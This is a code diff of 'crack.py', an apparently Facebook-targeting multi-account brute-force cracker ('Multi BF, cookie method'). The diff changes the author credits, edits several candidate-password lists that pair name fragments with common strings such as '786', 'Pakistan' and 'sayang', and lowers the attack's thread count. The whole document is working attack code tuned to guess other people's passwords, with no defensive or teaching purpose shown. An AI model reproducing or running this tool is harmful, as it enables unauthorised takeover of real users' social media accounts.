@@ -5,9 +5,9 @@
 # Name           : Multi BF (MBF) <cookie method>     #
 # File           : crack.py                           #
 # Author         : DulLah                             #
-# Github         : https://github.com/dz-id           #
-# Facebook       : https://www.facebook.com/dulahz    #
-# Telegram       : https://t.me/unikers               #
+# Github         : https://github.com/zafarking788          #
+# Facebook       : https://www.facebook.com/*    #
+#             #
 # Python version : 2.7                                #
 #######################################################
 
@@ -97,7 +97,7 @@ class Brute:
 						obj[0]+'12345', obj[0]+'786',
 						obj[1]+'786', obj[2]+'786',
 						obj[3]+'786', 'Pakistan',
-						'pakistan', '123456789',
+						'pakistan', '000786',
 						'sayang', '786786',
 						'sayang123', 'Sayang',
 						'123456',
@@ -107,7 +107,7 @@ class Brute:
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',
 						'Pakistan', '123456',
-						'pakistan', '123456789',
+						'pakistan', '000786',
 						'sayang', '786786',
 						'sayang123', 'Sayang',
 						
@@ -118,7 +118,7 @@ class Brute:
 						obj[1]+'123', obj[1]+'12345',
 						obj[2]+'123', obj[2]+'12345',
 						'Pakistan', '123456',
-						'pakistan', '123456789',
+						'pakistan', '000786',
 						'sayang', '786786',
 						'sayang123', 'Sayang',
 					]
@@ -129,7 +129,7 @@ class Brute:
 						obj[2]+'123', obj[2]+'12345',
 						obj[3]+'123', obj[3]+'12345',
 						'Pakistan', '123456',
-						'pakistan', '123456789',
+						'pakistan', '000786',
 						'sayang', '786786',
 						'sayang123', 'Sayang',
 					]
@@ -154,7 +154,7 @@ class Brute:
 				if self.setpw[0] != '':
 					break
 				
-		th(100).map(self.brute, self.target)
+		th(30).map(self.brute, self.target)
 		self.results()
 		exit()
 
